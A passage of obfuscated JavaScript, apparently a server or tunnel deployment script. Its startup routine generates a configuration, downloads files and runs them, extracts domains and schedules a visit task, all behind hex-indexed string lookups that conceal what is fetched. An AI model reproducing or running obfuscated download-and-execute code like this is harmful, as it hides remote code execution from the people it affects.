console[_0x187926(0x1bc)](_0x187926(0x1fd)),_0x2b51f9;}catch(_0x5e2065){return console[_0x187926(0x20a)](_0x187926(0x27a)+_0x5e2065[_0x187926(0x1de)]),null;}}async function startserver(){const _0x911bf5=_0x2811d7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x373c5a){console[_0x911bf5(0x20a)](_0x911bf5(0x268),_0x373c5a);}}startserver()[_0x2811d7(0x265)](_0x1a2165=>{const _0x501616=_0x2811d7;console[_0x501616(0x20a)](_0x501616(0x26a),_0x1a2165);}),app[_0x2811d7(0x1fa)](PORT,()=>console[_0x2811d7(0x1bc)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
